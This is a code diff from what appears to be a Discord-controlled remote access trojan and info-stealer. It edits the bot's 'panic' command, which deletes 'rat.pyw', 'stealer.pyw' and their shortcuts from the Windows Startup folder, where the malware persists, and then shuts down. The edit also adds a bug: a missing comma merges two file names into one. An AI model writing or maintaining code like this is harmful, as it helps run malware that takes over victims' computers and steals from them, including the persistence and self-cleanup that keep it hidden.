@@ -116,14 +116,14 @@ async def panic(ctx):
     
     startup_directory = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
     files_to_delete = [
-        'rat.pyw',
         'stealer.pyw',
         'rat.lnk',
         'stealer.lnk'
+        'rat.pyw'
     ]
     
-    Popen(['cmd.exe', '/c', f'del {startup_directory}\\{files_to_delete[0]} && del {startup_directory}\\{files_to_delete[1]} && del {startup_directory}\\{files_to_delete[2]} && del {startup_directory}\\{files_to_delete[3]}'], shell=True)
-    
+    for file in files_to_delete:
+        os.remove(f"{startup_directory}\\{file}")
     await ctx.send("System closed.")
     exit()
 
